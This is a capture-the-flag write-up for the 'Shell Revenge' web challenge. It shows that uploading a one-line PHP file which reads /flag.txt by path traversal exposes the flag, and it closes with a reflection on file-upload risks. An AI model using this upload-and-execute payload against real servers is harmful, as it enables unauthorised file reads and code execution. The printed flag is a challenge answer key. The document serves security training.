## Challenge Name: Shell Revenge
**Category:** Web

**Challenge Description:**

The time has come to say enough to the abuses of Super Mario! Koopa brothers, let's take back our freedom. Power to the shells!

The flag is located in /flag.txt

Website: http://shellrevenge.challs.olicyber.it

### Approach

The website let's you upload a file and let's you look it up on the server side.

Uploading the following [php code](/olicyber-training/web/Shell-revenge/solve.php) inside a .php file makes possible to retrive the flag at ```/flag.txt```

```php
<?php echo file_get_contents("../../../../../flag.txt"); ?>
```

**Flag**
```
flag{sh3l1_p0w3r_1s_k00p4_p0w3r}
```

### Reflections

This challenge underscores the risks associated with user-controlled file uploads, demonstrating how a malicious user could exploit such features to execute arbitrary code on the server. 

---
<a href="/olicyber-training/main.md" class="btn">Back to home</a>


